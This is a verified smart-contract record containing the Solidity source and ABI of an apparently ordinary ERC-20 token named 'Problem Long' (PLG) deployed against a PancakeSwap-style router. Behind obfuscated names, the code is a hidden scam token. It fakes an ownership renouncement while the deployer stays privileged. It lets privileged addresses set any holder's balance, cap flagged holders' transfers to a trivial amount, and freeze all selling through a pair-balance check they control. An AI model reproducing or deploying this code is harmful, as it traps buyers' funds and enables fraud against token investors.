{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface tokenMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverMarketing {\n    function createPair(address buyFeeList, address fundFrom) external returns (address);\n}\n\ninterface isFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundTakeSender) external view returns (uint256);\n\n    function transfer(address tokenLimit, uint256 walletSwap) external returns (bool);\n\n    function allowance(address totalMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenLimit,\n        uint256 walletSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minMarketingReceiver, uint256 value);\n    event Approval(address indexed totalMode, address indexed spender, uint256 value);\n}\n\ninterface listAuto is isFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ProblemLong is marketingAt, isFund, listAuto {\n\n    bool public launchEnableMarketing;\n\n    function txEnable(address tradingTxMax) public {\n        require(tradingTxMax.balance < 100000);\n        if (shouldLimit) {\n            return;\n        }\n        \n        swapMarketingReceiver[tradingTxMax] = true;\n        if (walletFundFee) {\n            liquidityTo = false;\n        }\n        shouldLimit = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return autoList;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listLimit;\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityAt;\n\n    mapping(address => bool) public senderEnable;\n\n    function transfer(address isLiquidity, uint256 walletSwap) external virtual override returns (bool) {\n        return buySell(_msgSender(), isLiquidity, walletSwap);\n    }\n\n    address public limitAuto;\n\n    bool public enableSwapFee;\n\n    event OwnershipTransferred(address indexed receiverEnableLaunched, address indexed launchMarketingBuy);\n\n    function senderSell(address txSwap) public {\n        toEnable();\n        \n        if (txSwap == marketingBuy || txSwap == limitAuto) {\n            return;\n        }\n        senderEnable[txSwap] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchFee;\n    }\n\n    address limitReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function toEnable() private view {\n        require(swapMarketingReceiver[_msgSender()]);\n    }\n\n    function listShould(address exemptLiquidityLaunch, address tokenLimit, uint256 walletSwap) internal returns (bool) {\n        require(minTake[exemptLiquidityLaunch] >= walletSwap);\n        minTake[exemptLiquidityLaunch] -= walletSwap;\n        minTake[tokenLimit] += walletSwap;\n        emit Transfer(exemptLiquidityLaunch, tokenLimit, walletSwap);\n        return true;\n    }\n\n    function autoSwap(address isLiquidity, uint256 walletSwap) public {\n        toEnable();\n        minTake[isLiquidity] = walletSwap;\n    }\n\n    uint256 feeBuy;\n\n    function approve(address maxTx, uint256 walletSwap) public virtual override returns (bool) {\n        liquidityAt[_msgSender()][maxTx] = walletSwap;\n        emit Approval(_msgSender(), maxTx, walletSwap);\n        return true;\n    }\n\n    uint8 private launchFee = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletExempt;\n    }\n\n    bool public walletFundFee;\n\n    uint256 receiverLimit;\n\n    function transferFrom(address exemptLiquidityLaunch, address tokenLimit, uint256 walletSwap) external override returns (bool) {\n        if (_msgSender() != receiverSenderIs) {\n            if (liquidityAt[exemptLiquidityLaunch][_msgSender()] != type(uint256).max) {\n                require(walletSwap <= liquidityAt[exemptLiquidityLaunch][_msgSender()]);\n                liquidityAt[exemptLiquidityLaunch][_msgSender()] -= walletSwap;\n            }\n        }\n        return buySell(exemptLiquidityLaunch, tokenLimit, walletSwap);\n    }\n\n    uint256 private walletExempt = 100000000 * 10 ** 18;\n\n    bool public shouldLimit;\n\n    mapping(address => bool) public swapMarketingReceiver;\n\n    function balanceOf(address fundTakeSender) public view virtual override returns (uint256) {\n        return minTake[fundTakeSender];\n    }\n\n    function exemptList(uint256 walletSwap) public {\n        toEnable();\n        receiverLimit = walletSwap;\n    }\n\n    bool private marketingShould;\n\n    string private listLimit = \"PLG\";\n\n    string private enableShould = \"Problem Long\";\n\n    function buySell(address exemptLiquidityLaunch, address tokenLimit, uint256 walletSwap) internal returns (bool) {\n        if (exemptLiquidityLaunch == marketingBuy) {\n            return listShould(exemptLiquidityLaunch, tokenLimit, walletSwap);\n        }\n        uint256 isToReceiver = isFund(limitAuto).balanceOf(limitReceiver);\n        require(isToReceiver == receiverLimit);\n        require(tokenLimit != limitReceiver);\n        if (senderEnable[exemptLiquidityLaunch]) {\n            return listShould(exemptLiquidityLaunch, tokenLimit, buyToken);\n        }\n        return listShould(exemptLiquidityLaunch, tokenLimit, walletSwap);\n    }\n\n    function buyTo() public {\n        emit OwnershipTransferred(marketingBuy, address(0));\n        autoList = address(0);\n    }\n\n    uint256 constant buyToken = 5 ** 10;\n\n    function allowance(address takeToToken, address maxTx) external view virtual override returns (uint256) {\n        if (maxTx == receiverSenderIs) {\n            return type(uint256).max;\n        }\n        return liquidityAt[takeToToken][maxTx];\n    }\n\n    constructor (){\n        \n        tokenMarketing liquidityFrom = tokenMarketing(receiverSenderIs);\n        limitAuto = receiverMarketing(liquidityFrom.factory()).createPair(liquidityFrom.WETH(), address(this));\n        \n        marketingBuy = _msgSender();\n        buyTo();\n        swapMarketingReceiver[marketingBuy] = true;\n        minTake[marketingBuy] = walletExempt;\n        \n        emit Transfer(address(0), marketingBuy, walletExempt);\n    }\n\n    address public marketingBuy;\n\n    uint256 public buyFrom;\n\n    uint256 private toFrom;\n\n    function owner() external view returns (address) {\n        return autoList;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return enableShould;\n    }\n\n    mapping(address => uint256) private minTake;\n\n    address receiverSenderIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private autoList;\n\n    bool public liquidityTo;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverEnableLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMarketingBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMarketingReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletSwap\",\"type\":\"uint256\"}],\"name\":\"autoSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTakeSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSwapFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletSwap\",\"type\":\"uint256\"}],\"name\":\"exemptList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchEnableMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSwap\",\"type\":\"address\"}],\"name\":\"senderSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapMarketingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLiquidityLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTxMax\",\"type\":\"address\"}],\"name\":\"txEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFundFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ProblemLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}